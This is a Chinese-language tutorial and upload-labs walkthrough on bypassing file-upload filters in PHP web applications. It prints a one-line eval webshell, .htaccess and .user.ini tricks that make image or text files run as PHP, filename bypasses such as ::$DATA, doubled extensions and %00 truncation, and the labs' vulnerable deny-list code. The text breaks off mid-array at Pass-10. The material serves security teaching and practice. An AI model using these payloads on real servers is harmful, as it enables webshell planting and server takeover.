一、黑名单绕过 黑名单简单来说就是目标程序规定了哪些文件不能上传\n1、大小写绕过\n这个没什么好讲的，举个简单的例子，如下\n本来需要上传一个名为a.php的木马文件，有时候将文件名改为以下的样子就能绕过一些黑名单限制\nplain\r1 2 3 a.PHP a.Php a.PhP 还有几种组合啊，懒得写了，这种方式还是比较简单的\n2、空格绕过\n在讲解空格绕过之前要先给大家讲一个系统层面上的特性\nplain\r1 2 在系统层面上，当我保存了一个名为a.txt的文件时，当我在文件名 前面或者后面加上一个空格，在保存时在系统层面上是没有空格的，但是在PHP传输的过程中，是可以识别这个空格的，所以也就诞生我们的空格绕过方式 例： 如果目标的黑名单过滤中只有“.php”，而没有“.php ”这样的后缀时，就可以上传时使用burp抓包，在上传的文件名前面或者后面添加空格，再放包就能成功上传，实现绕过 3、点号绕过\nplain\r1 这个点号绕过也是系统层面的原理，很空格过滤没什么区别，当你重命名文件名时，如果在 文件后缀名加上一个点，此时保存后系统会在自动过滤末尾的点号 使用方法同空格过滤一样，例如上传一个a.php文件，burp抓包将文件名改为“a.php.”，此时放包，如果黑名单检测中没有对“php.”过滤，就能实现绕过\n4、::$data绕过\nplain\r1 条件：只适用于windows 这里能绕过的原理是因为windows的NTFS文件系统的一个特性，windows都适用\nplain\r1 2 也就是当我们访问a.php::$data时，也就是相当于访问a.php本身 当我们访问ab:a.php::$data时，也就是访问ab文件夹下的a.php文件本身 这个绕过方式的使用和前面两个一样，都是burp抓包改文件名就行了，例如把a.php改为a.php::$data,只要他没有做对应的过滤就能绕过黑名单检测\n**注意：**这种方法确实能绕过限制，但是当我们开新标签访问我们上传的文件时会报错，需要把此时url中的::$data删掉才能正常访问\n5、单次过滤绕过\n先来看看下面这一段过滤代码\nplain\r1 2 3 4 5 6 7 $deny_ext = array(\u0026#34;.php\u0026#34;,\u0026#34;.php5\u0026#34;,\u0026#34;.php4\u0026#34;,\u0026#34;.php3\u0026#34;,\u0026#34;.php2\u0026#34;,\u0026#34;.html\u0026#34;,\u0026#34;.htm\u0026#34;,\u0026#34;.phtml\u0026#34;,\u0026#34;.pht\u0026#34;,\u0026#34;.pHp\u0026#34;,\u0026#34;.pHp5\u0026#34;,\u0026#34;.pHp4\u0026#34;,\u0026#34;.pHp3\u0026#34;,\u0026#34;.pHp2\u0026#34;,\u0026#34;.Html\u0026#34;,\u0026#34;.Htm\u0026#34;,\u0026#34;.pHtml\u0026#34;,\u0026#34;.jsp\u0026#34;,\u0026#34;.jspa\u0026#34;,\u0026#34;.jspx\u0026#34;,\u0026#34;.jsw\u0026#34;,\u0026#34;.jsv\u0026#34;,\u0026#34;.jspf\u0026#34;,\u0026#34;.jtml\u0026#34;,\u0026#34;.jSp\u0026#34;,\u0026#34;.jSpx\u0026#34;,\u0026#34;.jSpa\u0026#34;,\u0026#34;.jSw\u0026#34;,\u0026#34;.jSv\u0026#34;,\u0026#34;.jSpf\u0026#34;,\u0026#34;.jHtml\u0026#34;,\u0026#34;.asp\u0026#34;,\u0026#34;.aspx\u0026#34;,\u0026#34;.asa\u0026#34;,\u0026#34;.asax\u0026#34;,\u0026#34;.ascx\u0026#34;,\u0026#34;.ashx\u0026#34;,\u0026#34;.asmx\u0026#34;,\u0026#34;.cer\u0026#34;,\u0026#34;.aSp\u0026#34;,\u0026#34;.aSpx\u0026#34;,\u0026#34;.aSa\u0026#34;,\u0026#34;.aSax\u0026#34;,\u0026#34;.aScx\u0026#34;,\u0026#34;.aShx\u0026#34;,\u0026#34;.aSmx\u0026#34;,\u0026#34;.cEr\u0026#34;,\u0026#34;.sWf\u0026#34;,\u0026#34;.swf\u0026#34;,\u0026#34;.htaccess\u0026#34;); $file_name = trim($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, \u0026#39;.\u0026#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(\u0026#39;::$DATA\u0026#39;, \u0026#39;\u0026#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 假设我们上传的文件经过这样一次过滤后才能成功上传，初略一看这里的过滤其实还挺多的，但是这里有一个最大的问题——我们上传的文件只经过了一次这样的过滤，例如我们上传a.php，burp抓包后修改为“a.php. .”，此时点击放包，处理流程如下\nplain\r1 2 3 遇到上面删除文件末尾的点的过滤时， 末尾的点被删除，此时文件名——“a.php. ” 接着往下过滤，遇到首位去空时， 末尾的空格被删除，此时文件名——“a.php.” 接着往下过滤，你会发现它已经过滤完了，它会将此时的结果拿去$deny_ext进行 黑名单检测 但是黑名单中“a.php.”能被检测到吗？不能，所以自然就绕过了过滤\nplain\r1 这里的思路就是假如我们已经知道了目标的一个过滤规则，那我们就可以尝试 使用两次对应的过滤来绕过，假如它所有的过滤都只进行一次，那就可以宣布拿下了 6、后缀双写绕过\n双写后缀的方式只适合 目标服务器的过滤规则是检测到黑名单后缀时，将文件名中对应后缀删除的情况\n例如服务器检测的黑名单如下\nplain\r1 $deny_ext = array(\u0026#34;.php\u0026#34;,\u0026#34;.php5\u0026#34;,\u0026#34;.php4\u0026#34;,\u0026#34;.php3\u0026#34;,\u0026#34;.php2\u0026#34;,\u0026#34;.html\u0026#34;,\u0026#34;.htm\u0026#34;,\u0026#34;.phtml\u0026#34;,\u0026#34;.pht\u0026#34;,\u0026#34;.pHp\u0026#34;,\u0026#34;.pHp5\u0026#34;,\u0026#34;.pHp4\u0026#34;,\u0026#34;.pHp3\u0026#34;,\u0026#34;.pHp2\u0026#34;,\u0026#34;.Html\u0026#34;,\u0026#34;.Htm\u0026#34;,\u0026#34;.pHtml\u0026#34;,\u0026#34;.jsp\u0026#34;,\u0026#34;.jspa\u0026#34;,\u0026#34;.jspx\u0026#34;,\u0026#34;.jsw\u0026#34;,\u0026#34;.jsv\u0026#34;,\u0026#34;.jspf\u0026#34;,\u0026#34;.jtml\u0026#34;,\u0026#34;.jSp\u0026#34;,\u0026#34;.jSpx\u0026#34;,\u0026#34;.jSpa\u0026#34;,\u0026#34;.jSw\u0026#34;,\u0026#34;.jSv\u0026#34;,\u0026#34;.jSpf\u0026#34;,\u0026#34;.jHtml\u0026#34;,\u0026#34;.asp\u0026#34;,\u0026#34;.aspx\u0026#34;,\u0026#34;.asa\u0026#34;,\u0026#34;.asax\u0026#34;,\u0026#34;.ascx\u0026#34;,\u0026#34;.ashx\u0026#34;,\u0026#34;.asmx\u0026#34;,\u0026#34;.cer\u0026#34;,\u0026#34;.aSp\u0026#34;,\u0026#34;.aSpx\u0026#34;,\u0026#34;.aSa\u0026#34;,\u0026#34;.aSax\u0026#34;,\u0026#34;.aScx\u0026#34;,\u0026#34;.aShx\u0026#34;,\u0026#34;.aSmx\u0026#34;,\u0026#34;.cEr\u0026#34;,\u0026#34;.sWf\u0026#34;,\u0026#34;.swf\u0026#34;,\u0026#34;.htaccess\u0026#34;); plain\r1 2 此时我们上传一个a.php文件，服务器会那黑名单中的内容来匹配，匹配到php后，就会把原来的文件名“ a.php”后面的php后缀删掉，此时的文件名——“ a.”，此时这个文件倒是能成功上传，但是已经不会被解析为php了，，这就是整个过滤流程 而我们对应的绕过方式就是——双写后缀绕过 条件还是这个服务器只进行了一次过滤，例如我们上传a.php，burp抓包，将文件名改为“a.pphphp”\nplain\r1 2 进入文件上传流程，识别文件后缀，为“pphphp”。 从左到右识别，当识别当第二位到第四位的php时，即“p phphp”,判定后缀名存在黑名单，将识别到的php删除，后缀中剩下的字符组合后，此时后缀“pphphp”就成了“php”,此时剩下的文件名——“a.php”,程序以为处理完了，没有危害，所以文件成功上传，不进行拦截，即成功绕过 a.php文件，自然我们访问时也能以正常php去解析\n二、白名单绕过 白名单简单来说就是目标程序规定了能上传的后缀名\n1、MIME类型检测绕过\nMIME多用途网络邮件扩展类型，可被称为Media type或Content type，它设定某种类型的文件当被浏览器打开的时候需要用什么样的应用程序，多用于HTTP通信和设定文档类型例如HTML。之所以叫多用途网络邮件扩展类型，因为它最早被用于电子邮件系统，后用于浏览器。\n常见的类型有：\n那么在我们抓包的时候，content-type里面的值，就是文件的mime类型，如果后台是根据这个来判断文件类型的，那么就存在mime类型的检测绕过。\n即上传时抓包，将mine类型改为它允许上传的类型即可绕过验证\n2、路径栏00截断绕过\n条件：\nphp版本\u0026lt; 5.3\nphp.ini这个配置文件中 magic_quotes_gpc必须为 off\n上传路径可控\n必须满足这两个条件才能使用00截断\n原理：\n0x00是字符串的结束标识符，攻击者可以利用手动添加标识符的方式来将后面的内容弄进行截断，这样标识符后面的内容就能帮我们绕过检测\n实例：\n例如一个程序在代码中规定只允许上传png,jpg,gif后缀的文件，而我们需要上传一个名为aa.php的一句话木马文件，可以使用如下方法:\n1、选中aa.php文件并上传，在上传时使用burp抓包,如下\n2、修改文件保存路径和文件名\n最初的保存路径是 ../upload/,文件名是 aa.php,所以经过拼接后 aa.php上传后的相对路径位置是 ../upload/aa.php\n此时我们将文件报错路径修改为“../upload/test.php%00aa.php”。%00是结束符的url编码格式\n文件名修改为“aa.jpg”，如下\n此时我们上传的文件最后的路径就会拼接成为——“../upload/test.php%00aa.jpg”，因为过滤规则只对文件名生效，也就是filename参数对应的“aa.jpg”，目标允许jpg文件上传，所以绕过过滤自然是没有问题的\n很多人会问，那我们上传的aa.php中的一句话木马内容在哪去了？自然也就是在test.php里面去了。因为%00后面的语句不会被识别，所以能成功上传，内容也成功解析为php\n此时访问test.php就能成功访问我们上传的php文件内容\n靶场练习 Pass-01-禁用JS 目标：绕过文件上传限制，成功上传一个webshell(是一种恶意脚本或程序)并执行。\n创建一个 PHP 文件\nphp\r1 \u0026lt;?php @eval($_POST[\u0026#39;cmd\u0026#39;]); ?\u0026gt; 尝试上传\n分析代码这是一个js拦截\njavascript\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function checkFile() { var file = document.getElementsByName(\u0026#39;upload_file\u0026#39;)[0].value; if (file == null || file == \u0026#34;\u0026#34;) { alert(\u0026#34;请选择要上传的文件!\u0026#34;); return false; } //定义允许上传的文件类型 var allow_ext = \u0026#34;.jpg|.png|.gif\u0026#34;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\u0026#34;.\u0026#34;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \u0026#34;|\u0026#34;) == -1) { var errMsg = \u0026#34;该文件不允许上传，请上传\u0026#34; + allow_ext + \u0026#34;类型的文件,当前文件类型为：\u0026#34; + ext_name; alert(errMsg); return false; } } 方法一：直接禁用浏览器的js\n（1）火狐：地址栏输入about:config\n搜索栏搜javascript.enabled\n为ture是为开启JavaScript为false时为关闭JavaScript\n（2）右键\u0026mdash;检查\u0026mdash;调试器\u0026mdash;设置\u0026mdash;禁用JavaScript\n（3）扩展\n方法二：删除checkFile()函数\n测试成功：\nPass-02-MIME类型 MIME类型：浏览器通过\nplain\r1 $_FILES[\u0026#39;file\u0026#39;][\u0026#39;type\u0026#39;] 发送文件的MIME类型(如image/jpeg)，但完全由客户端控制，攻击者可通过修改 HTTP 请求伪造此值\nphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;] == \u0026#39;image/jpeg\u0026#39;) || ($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;] == \u0026#39;image/png\u0026#39;) || ($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;] == \u0026#39;image/gif\u0026#39;)) {// $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39; . $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;] if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = \u0026#39;上传出错！\u0026#39;; } } else { $msg = \u0026#39;文件类型不正确，请重新上传！\u0026#39;; } } else { $msg = UPLOAD_PATH.\u0026#39;文件夹不存在,请手工创建！\u0026#39;; } } 使用burp抓包\n修改content-type(是向服务器告知传输的是什么文件)\n复制图片链接\n验证通过\nPass-03-后缀伪造绕过 前置条件： 1.切换版本\n记录BUG—在uploadlabs第三关中—关于phpstudy中修改httpd.conf依旧无法解析.php3d等问题_upload-labs无法解析php3-CSDN博客\n修改后缀来绕过检查，例如修改为\u0026quot;.php3\u0026quot;,\u0026quot;.php5\u0026quot;\nPass-04-.htaccess 配置解析绕过 前置条件： 1.mod_rewrite模块开启。\n（1）打开httpd.conf\n（2）检查#LoadModule rewrite_module modules/mod_rewrite.so，去掉前面的#\n若没有LoadModule rewrite_module modules/mod_rewrite.so，可以随便找一个LoadModule语句的附近添加\n（3）确保mod_rewrite.so文件存在\n（4）配置.htaccess支持\n打开httpd.conf，搜索找到AllowOverride，将后面的NONE改为ALL，保险起见，俩处都改。\n（5）在httpd.conf文件的末尾添加以下内容，确保RewriteEngine已启用：\nplain\r1 2 3 \u0026lt;IfModule mod_rewrite.c\u0026gt; RewriteEngine On \u0026lt;/IfModule\u0026gt; （6）保存！！！保存！！！保存！！！\n（7）测试\n在网站根目录www下创建一个.htaccess文件，写入以下内容：\nplain\r1 2 RewriteEngine On RewriteRule ^test$ index.php [L] 然后访问http://域名/test，如果跳转到index.php，说明mod_rewrite已启用。\n2..htaccess\n.htaccess 是一个配置文件，主要用于 Apache 服务器。它放在网站的某个目录里，用来控制该目录及其子目录的行为。\n新建一个.htaccess文件，注意：.htaccess文件不能有文件名，否则不运行！！！\nplain\r1 2 3 4 5 AddType application/x-httpd-php .jpg .txt //这行代码的意思是让服务器把 .jpg 和 .txt 文件当作 PHP 脚本来执行。 //AddType 是 .htaccess 中的一个指令，用来指定文件类型和处理方式。 //application/x-httpd-php 是 PHP 文件的 MIME 类型，表示用 PHP 解析器处理这些文件。 //.jpg .txt 是文件扩展名，表示对这两种文件应用该规则。 上传.htaccess文件\n之后上传一句话木马图片（图片可以直接由php文件改后缀名为jpg）\n链接成功\nPass-05- .user.ini 自动包含绕过 前置条件： 1..user.ini 是一个配置文件，它类似于 .htaccess，但专门用于配置 PHP 的行为。可以把它放在网站的某个目录中，用来覆盖服务器的主 PHP 配置（php.ini），在不修改服务器全局配置的情况下，灵活调整 PHP 的行为。\n2.切换版本\n写一个.user.ini配置文件，上传到服务器，\nplain\r1 2 3 4 5 auto_prepend_file=1.txt // PHP 在执行每个脚本之前，自动预加载指定的文件1.txt。 具体解释 auto_prepend_file：这是一个 PHP 配置选项，用于指定一个文件路径。PHP 会在执行每个脚本之前，先加载并运行这个文件。 1.txt：这是你指定的文件路径。PHP 会尝试加载这个文件，并将其内容作为 PHP 代码执行。 再上传一个1.txt\n在蚁剑中输入url时，最后一项不要写1.txt，而是readme.php，这个文件是靶场自带的一个php文件，而你的.user.ini文件中写的就是启动php文件的时候启动1.txt，所以要启动的是readme.php\nPass-06_大小写绕过 php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026#34;.php\u0026#34;,\u0026#34;.php5\u0026#34;,\u0026#34;.php4\u0026#34;,\u0026#34;.php3\u0026#34;,\u0026#34;.php2\u0026#34;,\u0026#34;.html\u0026#34;,\u0026#34;.htm\u0026#34;,\u0026#34;.phtml\u0026#34;,\u0026#34;.pht\u0026#34;,\u0026#34;.pHp\u0026#34;,\u0026#34;.pHp5\u0026#34;,\u0026#34;.pHp4\u0026#34;,\u0026#34;.pHp3\u0026#34;,\u0026#34;.pHp2\u0026#34;,\u0026#34;.Html\u0026#34;,\u0026#34;.Htm\u0026#34;,\u0026#34;.pHtml\u0026#34;,\u0026#34;.jsp\u0026#34;,\u0026#34;.jspa\u0026#34;,\u0026#34;.jspx\u0026#34;,\u0026#34;.jsw\u0026#34;,\u0026#34;.jsv\u0026#34;,\u0026#34;.jspf\u0026#34;,\u0026#34;.jtml\u0026#34;,\u0026#34;.jSp\u0026#34;,\u0026#34;.jSpx\u0026#34;,\u0026#34;.jSpa\u0026#34;,\u0026#34;.jSw\u0026#34;,\u0026#34;.jSv\u0026#34;,\u0026#34;.jSpf\u0026#34;,\u0026#34;.jHtml\u0026#34;,\u0026#34;.asp\u0026#34;,\u0026#34;.aspx\u0026#34;,\u0026#34;.asa\u0026#34;,\u0026#34;.asax\u0026#34;,\u0026#34;.ascx\u0026#34;,\u0026#34;.ashx\u0026#34;,\u0026#34;.asmx\u0026#34;,\u0026#34;.cer\u0026#34;,\u0026#34;.aSp\u0026#34;,\u0026#34;.aSpx\u0026#34;,\u0026#34;.aSa\u0026#34;,\u0026#34;.aSax\u0026#34;,\u0026#34;.aScx\u0026#34;,\u0026#34;.aShx\u0026#34;,\u0026#34;.aSmx\u0026#34;,\u0026#34;.cEr\u0026#34;,\u0026#34;.sWf\u0026#34;,\u0026#34;.swf\u0026#34;,\u0026#34;.htaccess\u0026#34;,\u0026#34;.ini\u0026#34;); $file_name = trim($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, \u0026#39;.\u0026#39;); $file_ext = str_ireplace(\u0026#39;::$DATA\u0026#39;, \u0026#39;\u0026#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.date(\u0026#34;YmdHis\u0026#34;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = \u0026#39;上传出错！\u0026#39;; } } else { $msg = \u0026#39;此文件类型不允许上传！\u0026#39;; } } else { $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; } } Windows系统对大小写并不敏感，而这个检测机制它是区分大小写的，所以我们只需要随机让几个字母大小写互换即可。\n切换版本！\n使用BP抓包，将文件后缀名的小写变成大写\nPass-07_空格绕过 php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026#34;.php\u0026#34;,\u0026#34;.php5\u0026#34;,\u0026#34;.php4\u0026#34;,\u0026#34;.php3\u0026#34;,\u0026#34;.php2\u0026#34;,\u0026#34;.html\u0026#34;,\u0026#34;.htm\u0026#34;,\u0026#34;.phtml\u0026#34;,\u0026#34;.pht\u0026#34;,\u0026#34;.pHp\u0026#34;,\u0026#34;.pHp5\u0026#34;,\u0026#34;.pHp4\u0026#34;,\u0026#34;.pHp3\u0026#34;,\u0026#34;.pHp2\u0026#34;,\u0026#34;.Html\u0026#34;,\u0026#34;.Htm\u0026#34;,\u0026#34;.pHtml\u0026#34;,\u0026#34;.jsp\u0026#34;,\u0026#34;.jspa\u0026#34;,\u0026#34;.jspx\u0026#34;,\u0026#34;.jsw\u0026#34;,\u0026#34;.jsv\u0026#34;,\u0026#34;.jspf\u0026#34;,\u0026#34;.jtml\u0026#34;,\u0026#34;.jSp\u0026#34;,\u0026#34;.jSpx\u0026#34;,\u0026#34;.jSpa\u0026#34;,\u0026#34;.jSw\u0026#34;,\u0026#34;.jSv\u0026#34;,\u0026#34;.jSpf\u0026#34;,\u0026#34;.jHtml\u0026#34;,\u0026#34;.asp\u0026#34;,\u0026#34;.aspx\u0026#34;,\u0026#34;.asa\u0026#34;,\u0026#34;.asax\u0026#34;,\u0026#34;.ascx\u0026#34;,\u0026#34;.ashx\u0026#34;,\u0026#34;.asmx\u0026#34;,\u0026#34;.cer\u0026#34;,\u0026#34;.aSp\u0026#34;,\u0026#34;.aSpx\u0026#34;,\u0026#34;.aSa\u0026#34;,\u0026#34;.aSax\u0026#34;,\u0026#34;.aScx\u0026#34;,\u0026#34;.aShx\u0026#34;,\u0026#34;.aSmx\u0026#34;,\u0026#34;.cEr\u0026#34;,\u0026#34;.sWf\u0026#34;,\u0026#34;.swf\u0026#34;,\u0026#34;.htaccess\u0026#34;,\u0026#34;.ini\u0026#34;); $file_name = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, \u0026#39;.\u0026#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(\u0026#39;::$DATA\u0026#39;, \u0026#39;\u0026#39;, $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.date(\u0026#34;YmdHis\u0026#34;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = \u0026#39;上传出错！\u0026#39;; } } else { $msg = \u0026#39;此文件不允许上传\u0026#39;; } } else { $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; } } 抓包加空格\nPass-08_点绕过 php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026#34;.php\u0026#34;,\u0026#34;.php5\u0026#34;,\u0026#34;.php4\u0026#34;,\u0026#34;.php3\u0026#34;,\u0026#34;.php2\u0026#34;,\u0026#34;.html\u0026#34;,\u0026#34;.htm\u0026#34;,\u0026#34;.phtml\u0026#34;,\u0026#34;.pht\u0026#34;,\u0026#34;.pHp\u0026#34;,\u0026#34;.pHp5\u0026#34;,\u0026#34;.pHp4\u0026#34;,\u0026#34;.pHp3\u0026#34;,\u0026#34;.pHp2\u0026#34;,\u0026#34;.Html\u0026#34;,\u0026#34;.Htm\u0026#34;,\u0026#34;.pHtml\u0026#34;,\u0026#34;.jsp\u0026#34;,\u0026#34;.jspa\u0026#34;,\u0026#34;.jspx\u0026#34;,\u0026#34;.jsw\u0026#34;,\u0026#34;.jsv\u0026#34;,\u0026#34;.jspf\u0026#34;,\u0026#34;.jtml\u0026#34;,\u0026#34;.jSp\u0026#34;,\u0026#34;.jSpx\u0026#34;,\u0026#34;.jSpa\u0026#34;,\u0026#34;.jSw\u0026#34;,\u0026#34;.jSv\u0026#34;,\u0026#34;.jSpf\u0026#34;,\u0026#34;.jHtml\u0026#34;,\u0026#34;.asp\u0026#34;,\u0026#34;.aspx\u0026#34;,\u0026#34;.asa\u0026#34;,\u0026#34;.asax\u0026#34;,\u0026#34;.ascx\u0026#34;,\u0026#34;.ashx\u0026#34;,\u0026#34;.asmx\u0026#34;,\u0026#34;.cer\u0026#34;,\u0026#34;.aSp\u0026#34;,\u0026#34;.aSpx\u0026#34;,\u0026#34;.aSa\u0026#34;,\u0026#34;.aSax\u0026#34;,\u0026#34;.aScx\u0026#34;,\u0026#34;.aShx\u0026#34;,\u0026#34;.aSmx\u0026#34;,\u0026#34;.cEr\u0026#34;,\u0026#34;.sWf\u0026#34;,\u0026#34;.swf\u0026#34;,\u0026#34;.htaccess\u0026#34;,\u0026#34;.ini\u0026#34;); $file_name = trim($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]); $file_ext = strrchr($file_name, \u0026#39;.\u0026#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(\u0026#39;::$DATA\u0026#39;, \u0026#39;\u0026#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = \u0026#39;上传出错！\u0026#39;; } } else { $msg = \u0026#39;此文件类型不允许上传！\u0026#39;; } } else { $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; } } 加点\nPass-09_::$DATA绕过 原理:Windows系统下，如果上传的文件名是test.php::$DATA，会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同。\nphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026#34;.php\u0026#34;,\u0026#34;.php5\u0026#34;,\u0026#34;.php4\u0026#34;,\u0026#34;.php3\u0026#34;,\u0026#34;.php2\u0026#34;,\u0026#34;.html\u0026#34;,\u0026#34;.htm\u0026#34;,\u0026#34;.phtml\u0026#34;,\u0026#34;.pht\u0026#34;,\u0026#34;.pHp\u0026#34;,\u0026#34;.pHp5\u0026#34;,\u0026#34;.pHp4\u0026#34;,\u0026#34;.pHp3\u0026#34;,\u0026#34;.pHp2\u0026#34;,\u0026#34;.Html\u0026#34;,\u0026#34;.Htm\u0026#34;,\u0026#34;.pHtml\u0026#34;,\u0026#34;.jsp\u0026#34;,\u0026#34;.jspa\u0026#34;,\u0026#34;.jspx\u0026#34;,\u0026#34;.jsw\u0026#34;,\u0026#34;.jsv\u0026#34;,\u0026#34;.jspf\u0026#34;,\u0026#34;.jtml\u0026#34;,\u0026#34;.jSp\u0026#34;,\u0026#34;.jSpx\u0026#34;,\u0026#34;.jSpa\u0026#34;,\u0026#34;.jSw\u0026#34;,\u0026#34;.jSv\u0026#34;,\u0026#34;.jSpf\u0026#34;,\u0026#34;.jHtml\u0026#34;,\u0026#34;.asp\u0026#34;,\u0026#34;.aspx\u0026#34;,\u0026#34;.asa\u0026#34;,\u0026#34;.asax\u0026#34;,\u0026#34;.ascx\u0026#34;,\u0026#34;.ashx\u0026#34;,\u0026#34;.asmx\u0026#34;,\u0026#34;.cer\u0026#34;,\u0026#34;.aSp\u0026#34;,\u0026#34;.aSpx\u0026#34;,\u0026#34;.aSa\u0026#34;,\u0026#34;.aSax\u0026#34;,\u0026#34;.aScx\u0026#34;,\u0026#34;.aShx\u0026#34;,\u0026#34;.aSmx\u0026#34;,\u0026#34;.cEr\u0026#34;,\u0026#34;.sWf\u0026#34;,\u0026#34;.swf\u0026#34;,\u0026#34;.htaccess\u0026#34;,\u0026#34;.ini\u0026#34;); $file_name = trim($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, \u0026#39;.\u0026#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.date(\u0026#34;YmdHis\u0026#34;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = \u0026#39;上传出错！\u0026#39;; } } else { $msg = \u0026#39;此文件类型不允许上传！\u0026#39;; } } else { $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; } } 可以看到这一关少了前几关中的 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA，所以可以使用::$DATA绕过\nPass-10-拼接路径 源代码：\nphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026#34;.php\u0026#34;,\u0026#34;.php5\u0026#34;,\u0026#34;.php4\u0026#34;,\u0026#34;.php3\u0026#34;,\u0026#34;.php2\u0026#34;,\u0026#34;.html\u0026#34;,\u0026#34;.htm\u0026#34;,\u0026#34;.phtml\u0026#34;,\u0026#34;.pht\u0026#34;,\u0026#34;.pHp\u0026#34;,\u0026#34;.pHp5\u0026#34;,\u0026#34;.pHp4\u0026#34;,\u0026#34;.pHp3\u0026#34;,\u0026#34;.pHp2\u0026#34;,\u0026#34;.Html\u0026#34;,\u0026#34;.Htm\u0026#34;,\u0026#34;.pHtml\u0026#34;,\u0026#34;.jsp\u0026#34;,\u0026#34;.jspa\u0026#34;,\u0026#34;.jspx\u0026#34;,\u0026#34;.jsw\u0026#34;,\u0026#34;.jsv\u0026#34;,\u0026#34;.jspf\u0026#34;,\u0026#34;.jtml\u0026#34;,\u0026#34;.jSp\u0026#34;,\u0026#34;.jSpx\u0026#34;,\u0026#34;.jSpa\u0026#34;,\u0026#34;.jSw\u0026#34;,\u0026#34;.jSv\u0026#34;,\u0026#34;.jSpf\u0026#34;,\u0026#34;.jHtml\u0026#34;,\u0026#34;.asp\u0026#34;,\u0026#34;.aspx\u0026#34;,\u0026#34;.asa\u0026#34;,\u0026#34;.asax\u0026#34;,\u0026#34;.ascx\u0026#34;,\u0026#34;.ashx\u0026#34;,\u0026#34;.asmx\u0026#34;,\u0026#34;.cer\u0026#34;,\u0026#34;.aSp\u0026#34;,\u0026#34;.aSpx\u0026#34;,\u0026#34;.aSa\u0026#